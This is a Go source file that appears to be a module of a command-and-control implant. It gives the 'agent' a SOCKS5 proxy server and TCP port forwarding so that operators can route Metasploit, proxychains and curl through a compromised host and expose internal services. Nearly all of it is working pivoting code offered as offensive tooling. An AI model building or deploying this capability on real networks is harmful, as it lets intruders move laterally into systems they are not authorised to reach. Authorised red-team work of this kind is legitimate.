package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ─── SOCKS5 Proxy Server ─────────────────────────────────────────────────────
//
// Starts an in-agent SOCKS5 proxy. Once running, operators route tools
// (proxychains, Metasploit, curl --proxy) through the agent's network.
//
// Protocol: RFC 1928 (SOCKS5) + RFC 1929 (username/password auth)
// Supports: CONNECT command (TCP forwarding)
// Stubs:    BIND, UDP ASSOCIATE (not needed for pivoting)

const (
	socks5Version   = 0x05
	authNoAuth      = 0x00
	authUserPass    = 0x02
	authNoAcceptable = 0xFF

	cmdConnect  = 0x01
	cmdBind     = 0x02
	cmdUDPAssoc = 0x03

	atypIPv4   = 0x01
	atypDomain = 0x03
	atypIPv6   = 0x04

	repSuccess         = 0x00
	repGeneralFailure  = 0x01
	repNotAllowed      = 0x02
	repNetUnreachable  = 0x03
	repHostUnreachable = 0x04
	repConnRefused     = 0x05
	repTTLExpired      = 0x06
	repCmdNotSupported = 0x07
	repAddrNotSupported = 0x08
)

var (
	socks5Mu       sync.Mutex
	socks5Listener net.Listener
	socks5Running  bool
	socks5Port     int
	socks5Username string
	socks5Password string
	socks5Conns    int // active connection count
)

// startSOCKS5 starts the SOCKS5 proxy on the given port.
// If user/pass are non-empty, username/password auth is required.
func startSOCKS5(port int, username, password string) (string, error) {
	socks5Mu.Lock()
	defer socks5Mu.Unlock()

	if socks5Running {
		return fmt.Sprintf("[*] SOCKS5 already running on :%d", socks5Port), nil
	}

	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", port))
	if err != nil {
		return "", fmt.Errorf("listen on :%d: %w", port, err)
	}

	socks5Listener = ln
	socks5Running  = true
	socks5Port     = port
	socks5Username = username
	socks5Password = password

	go socks5Accept(ln)

	auth := "no auth"
	if username != "" {
		auth = fmt.Sprintf("user=%s", username)
	}
	return fmt.Sprintf("[+] SOCKS5 proxy started on 0.0.0.0:%d (%s)", port, auth), nil
}

// stopSOCKS5 shuts down the SOCKS5 proxy.
func stopSOCKS5() string {
	socks5Mu.Lock()
	defer socks5Mu.Unlock()

	if !socks5Running {
		return "[*] SOCKS5 not running"
	}
	socks5Listener.Close()
	socks5Running = false
	return fmt.Sprintf("[+] SOCKS5 proxy stopped (%d connections were active)", socks5Conns)
}

// socks5Status returns current proxy state.
func socks5Status() string {
	socks5Mu.Lock()
	defer socks5Mu.Unlock()
	if !socks5Running {
		return "[*] SOCKS5 not running"
	}
	return fmt.Sprintf("[+] SOCKS5 running on :%d | active connections: %d", socks5Port, socks5Conns)
}

func socks5Accept(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			return // listener closed
		}
		socks5Mu.Lock()
		socks5Conns++
		socks5Mu.Unlock()
		go func(c net.Conn) {
			defer func() {
				c.Close()
				socks5Mu.Lock()
				socks5Conns--
				socks5Mu.Unlock()
			}()
			socks5HandleConn(c)
		}(conn)
	}
}

func socks5HandleConn(conn net.Conn) {
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// ── Auth negotiation ──────────────────────────────────────────────────────
	// Client: VER NMETHODS METHODS...
	header := make([]byte, 2)
	if _, err := io.ReadFull(conn, header); err != nil {
		return
	}
	if header[0] != socks5Version {
		return
	}
	nMethods := int(header[1])
	methods := make([]byte, nMethods)
	if _, err := io.ReadFull(conn, methods); err != nil {
		return
	}

	needAuth := socks5Username != ""
	selectedMethod := byte(authNoAcceptable)
	for _, m := range methods {
		if !needAuth && m == authNoAuth {
			selectedMethod = authNoAuth
			break
		}
		if needAuth && m == authUserPass {
			selectedMethod = authUserPass
			break
		}
	}

	conn.Write([]byte{socks5Version, selectedMethod})
	if selectedMethod == authNoAcceptable {
		return
	}

	// ── Username/password auth ────────────────────────────────────────────────
	if selectedMethod == authUserPass {
		// RFC 1929: 0x01 ULEN USER PLEN PASS
		authHdr := make([]byte, 2)
		if _, err := io.ReadFull(conn, authHdr); err != nil {
			return
		}
		// authHdr[0] = 0x01 (subnegotiation version)
		uLen := int(authHdr[1])
		user := make([]byte, uLen)
		io.ReadFull(conn, user)
		pLenBuf := make([]byte, 1)
		io.ReadFull(conn, pLenBuf)
		pass := make([]byte, int(pLenBuf[0]))
		io.ReadFull(conn, pass)

		if string(user) != socks5Username || string(pass) != socks5Password {
			conn.Write([]byte{0x01, 0xFF}) // auth failed
			return
		}
		conn.Write([]byte{0x01, 0x00}) // auth success
	}

	// ── Request ───────────────────────────────────────────────────────────────
	// VER CMD RSV ATYP DST.ADDR DST.PORT
	reqHdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, reqHdr); err != nil {
		return
	}
	if reqHdr[0] != socks5Version {
		return
	}
	cmd  := reqHdr[1]
	atyp := reqHdr[3]

	var target string
	switch atyp {
	case atypIPv4:
		addr := make([]byte, 4)
		io.ReadFull(conn, addr)
		target = net.IP(addr).String()
	case atypIPv6:
		addr := make([]byte, 16)
		io.ReadFull(conn, addr)
		target = "[" + net.IP(addr).String() + "]"
	case atypDomain:
		lenBuf := make([]byte, 1)
		io.ReadFull(conn, lenBuf)
		domain := make([]byte, int(lenBuf[0]))
		io.ReadFull(conn, domain)
		target = string(domain)
	default:
		socks5Reply(conn, repAddrNotSupported, "0.0.0.0", 0)
		return
	}

	portBuf := make([]byte, 2)
	io.ReadFull(conn, portBuf)
	port := binary.BigEndian.Uint16(portBuf)

	switch cmd {
	case cmdConnect:
		socks5Connect(conn, target, int(port))
	case cmdBind:
		socks5Reply(conn, repCmdNotSupported, "0.0.0.0", 0)
	case cmdUDPAssoc:
		socks5Reply(conn, repCmdNotSupported, "0.0.0.0", 0)
	default:
		socks5Reply(conn, repCmdNotSupported, "0.0.0.0", 0)
	}
}

func socks5Connect(client net.Conn, host string, port int) {
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	remote, err := net.DialTimeout("tcp", addr, 15*time.Second)
	if err != nil {
		rep := repHostUnreachable
		if strings.Contains(err.Error(), "refused") {
			rep = repConnRefused
		}
		socks5Reply(client, byte(rep), "0.0.0.0", 0)
		return
	}
	defer remote.Close()

	// Reply with BND.ADDR and BND.PORT
	localAddr := remote.LocalAddr().(*net.TCPAddr)
	socks5Reply(client, repSuccess, localAddr.IP.String(), localAddr.Port)

	client.SetDeadline(time.Time{}) // clear deadline for the tunnel phase

	// Bidirectional copy
	done := make(chan struct{}, 2)
	go func() { io.Copy(remote, client); done <- struct{}{} }()
	go func() { io.Copy(client, remote); done <- struct{}{} }()
	<-done
}

// socks5Reply sends a SOCKS5 response.
func socks5Reply(conn net.Conn, rep byte, bndAddr string, bndPort int) {
	ip := net.ParseIP(bndAddr)
	var atyp byte
	var addrBytes []byte
	if ip4 := ip.To4(); ip4 != nil {
		atyp = atypIPv4
		addrBytes = ip4
	} else if ip6 := ip.To16(); ip6 != nil {
		atyp = atypIPv6
		addrBytes = ip6
	} else {
		atyp = atypIPv4
		addrBytes = []byte{0, 0, 0, 0}
	}
	portBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(portBytes, uint16(bndPort))

	resp := append([]byte{socks5Version, rep, 0x00, atyp}, addrBytes...)
	resp  = append(resp, portBytes...)
	conn.Write(resp)
}

// ─── Port Forward ────────────────────────────────────────────────────────────

var (
	pfwdMu      sync.Mutex
	pfwdMap     = map[int]net.Listener{}
)

// startPortForward creates a local listener that forwards all connections to remoteAddr.
// Useful for exposing internal services through the agent.
func startPortForward(localPort int, remoteAddr string) (string, error) {
	pfwdMu.Lock()
	defer pfwdMu.Unlock()

	if _, exists := pfwdMap[localPort]; exists {
		return "", fmt.Errorf("port %d already forwarded", localPort)
	}

	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", localPort))
	if err != nil {
		return "", fmt.Errorf("listen: %w", err)
	}
	pfwdMap[localPort] = ln

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go pfwdHandle(conn, remoteAddr)
		}
	}()

	return fmt.Sprintf("[+] Port forward 0.0.0.0:%d → %s", localPort, remoteAddr), nil
}

func stopPortForward(localPort int) string {
	pfwdMu.Lock()
	defer pfwdMu.Unlock()
	ln, ok := pfwdMap[localPort]
	if !ok {
		return fmt.Sprintf("[-] No forward on port %d", localPort)
	}
	ln.Close()
	delete(pfwdMap, localPort)
	return fmt.Sprintf("[+] Stopped forward on port %d", localPort)
}

func pfwdHandle(client net.Conn, remoteAddr string) {
	defer client.Close()
	remote, err := net.DialTimeout("tcp", remoteAddr, 10*time.Second)
	if err != nil {
		return
	}
	defer remote.Close()
	done := make(chan struct{}, 2)
	go func() { io.Copy(remote, client); done <- struct{}{} }()
	go func() { io.Copy(client, remote); done <- struct{}{} }()
	<-done
}
